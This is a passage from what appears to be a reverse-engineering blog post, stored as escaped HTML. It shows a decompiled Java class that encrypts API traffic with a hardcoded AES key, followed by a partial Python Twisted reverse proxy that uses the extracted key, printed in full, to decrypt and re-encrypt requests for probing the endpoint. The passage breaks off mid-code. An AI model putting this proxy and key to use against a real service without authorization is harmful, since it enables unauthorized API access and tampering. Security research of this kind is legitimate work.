class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar6\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003evar7\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar9\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003evar12\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar7\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar12\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetBoolean\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e \u003cspan class=\"n\"\u003evar8\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar12\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e),\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003evar8\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"n\"\u003evar5\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Unknown\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eJust as we expected, this class does cryptography with a hardcoded key on the request and response bodies. It encrypts the payload and encodes it as base64, passing it as the parameter \u003ccode\u003ed\u003c/code\u003e. Let\u0026#39;s quickly implement this behavior into a transparent reverse proxy so we can actually access the endpoint and play with it (Twisted FTW).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003etwisted.internet\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003ereactor\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003etwisted.web\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eproxy\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eserver\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003etwisted.web.resource\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eEncodingResourceWrapper\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eResource\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eio\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eBytesIO\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003eStringIO\u003c/span\u003e\n\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eurllib\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eurlencode\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ebase64\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eb64decode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb64encode\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Cipher\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# https://stackoverflow.com/questions/12562021/aes-decryption-padding-with-pkcs5-python\n\u003c/span\u003e\u003cspan class=\"n\"\u003eBS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\n\u003cspan class=\"n\"\u003epad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eBS\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eBS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eBS\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eBS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003cspan class=\"n\"\u003eunpad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])]\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eAESCipher\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003e__init__\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ekey\u003c/span\u003e \u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hex\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eraw\u003c/span\u003e \u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eraw\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eraw\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003eraw\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eenc\u003c/span\u003e \u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eiv\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eenc\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eenc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eenc\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e:]\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eunpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003eenc\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eCryptEncoderFactory\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAESCipher\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;384f2e6a1a05e5223b80e960a0a65074\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencoderForRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"n\"\u003ek\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ek\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003ev\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e()})\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eencoded_payload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eurlencode\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;d\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eb64encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e))})\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eencoded_payload\u003c/span\u003e\n        \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eStringIO\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eencoded_payload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erequestHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremoveHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;content-length\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erequestHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esetRawHeaders\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;content-length\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eencoded_payload\u003c/span\u003e\u003cspan class=\"p\"\u003e))])\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eCryptEncoder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eCryptEncoder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003e__init__\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\n        \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\n        \u003cspan class=\"k\"\u003etry\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003edecrypted\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eb64decode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n            \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresponseHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremoveHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;content-length\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresponseHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esetRawHeaders\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;content-length\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypted\u003c/span\u003e\u003cspan class=\"p\"\u003e))])\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003edecrypted\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003edecrypted\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eexcept\u003c/span\u003e \u003cspan class=\"nb\"\u003eException\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Failed to decrypt response:\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eEncoderFactoryFactory\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003e__init__\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eencoders\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan 